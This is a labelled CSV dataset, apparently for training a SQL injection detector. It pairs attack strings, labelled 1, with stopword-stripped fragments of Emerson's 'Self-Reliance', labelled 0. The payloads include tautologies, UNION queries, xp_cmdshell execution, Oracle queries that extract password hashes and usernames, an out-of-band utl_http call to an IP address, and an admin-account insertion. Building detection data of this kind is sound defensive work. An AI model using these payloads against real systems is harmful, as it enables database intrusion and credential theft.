Sentence,Label
a,1
a' ,1
a' --,1
a' or 1 = 1; --,1
@,1
?,1
' and 1 = 0 )  union all,1
? or 1 = 1 --,1
x' and userid is NULL; --,1
x' and email is NULL; --,1
anything' or 'x' = 'x,1
x' and 1 =  ( select count ( * )  from tabname ) ; --,1
x' and members.email is NULL; --,1
x' or full_name like '%bob%,1
23 or 1 = 1; --,1
'; exec master..xp_cmdshell 'ping 172.10.1.255'--,1
a,1
1 or 1 = 1,1
1' or '1' = '1,1
1 and user_name (  )   =  'dbo',1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND 'i' = 'i",1
1'1,1
1 exec sp_  ( or exec xp_ ),1
1 and 1 = 1,1
1' and 1 =  ( select count ( * )  from tablenames ) ; --,1
"'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )",1
1 and user_name (  )   =  'dbo',1
\'; desc users; --,1
1\'1,1
1' and non_existant_table  =  '1,1
' or username is not NULL or username  =  ',1
"1 and ascii ( lower ( substring  (  (  select top 1 name from sysobjects where xtype = 'u' ) , 1, 1  )  )   )  > 116",1
"1 union all select 1,2,3,4,5,6,name from sysobjects where xtype  =  'u' --",1
1 uni/**/on select all from where,1
’ or ‘1’ = ’1,1
' or '1' = '1,1
'||utl_http.request ( 'httP://192.168.1.1/' ) ||',1
"' || myappadmin.adduser ( 'admin', 'newpass' )  || '",1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT banner FROM v$version WHERE ROWNUM = 1  )  )   AND 'i' = 'i,1
' AND 1 = utl_inaddr.get_host_address  (  (  SELECT SYS.LOGIN_USER FROM DUAL  )  )   AND 'i' = 'i,1
" Ah, could pass neutrality! Who thus avoid pledges, observed, observe unaffected, unbiased, unbribable, unaffrighted innocence, must always formidable",0
" He would utter opinions passing affairs, seen private, necessary, would sink like darts ear men, put fear",0
" These voices hear solitude, grow faint inaudible enter world",0
 Society everywhere conspiracy manhood every one members,0
" Society joint-stock company, members agree, better securing bread shareholder, surrender liberty culture eater",0
 The virtue request conformity,0
 Self-reliance aversion,0
" It loves realities creators, names customs",0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND 'i' = 'i",1
